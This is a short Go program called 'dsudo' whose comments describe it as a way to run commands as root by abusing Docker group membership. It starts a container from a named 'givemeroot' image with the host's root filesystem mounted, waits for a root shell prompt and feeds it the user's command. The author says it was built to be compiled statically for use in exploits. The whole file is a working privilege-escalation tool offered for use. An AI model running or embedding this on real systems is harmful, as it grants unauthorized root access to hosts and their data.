// dsudo
//
// dsudo application is inspired of sudo, it can execute commands as root
// by abuse docker. You need to be part of the docker group for this to work.
// Note right now there is no output from this command for that use the python implementation
// This one was made so it can be compiled static and be used in exploits.
// nighter - http://nighter.se
package main

import (
	"fmt"
	"os"

	gexpect "github.com/ThomasRooney/gexpect"
)

func main() {

	if len(os.Args) < 2 {
		fmt.Fprintf(os.Stderr, "Usage: dsudo <command>\n")
		os.Exit(1)
	}

	// This could be done cleaner but
	// as I'm a golang noob.
	command := ""
	for _, char := range os.Args[1:] {
		command += char + " "
	}

	child, err := gexpect.Spawn("docker run --rm -v /:/mnt -i -t nighter/givemeroot")
	if err != nil {
		panic(err)
	}

	child.Expect("sh-4.4#")
	child.SendLine(command)
	msg, _ := child.ReadLine()
	fmt.Printf("%s", msg)
	child.Close()
}
